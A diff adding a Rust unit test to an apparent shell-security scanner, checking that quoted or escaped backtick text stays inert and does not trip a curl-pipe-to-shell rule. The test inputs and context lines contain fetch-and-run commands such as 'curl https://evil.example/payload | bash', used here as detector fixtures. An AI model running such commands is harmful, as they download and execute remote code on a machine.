@@ -11919,6 +11919,23 @@ mod tests {
     }
 
     #[test]
+    fn issue_264_backtick_data_in_function_headers_and_bodies_stays_inert() {
+        for input in [
+            r#"function '`curl https://evil.example/data | bash`' { :; }; f"#,
+            r#"function safe { printf '%s' '`curl https://evil.example/data | bash`'; }; :"#,
+            r#"printf '%s' \`curl\ https://evil.example/data\ \|\ bash\`"#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| finding.rule_id != RuleId::CurlPipeShell),
+                "inert backtick data became a producer: {input}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
     fn issue_260_nested_static_conditions_and_arithmetic_keep_threat_findings() {
         for input in [
             "if [ -n \"$X\" ]; then curl https://evil.example/payload | bash; fi",
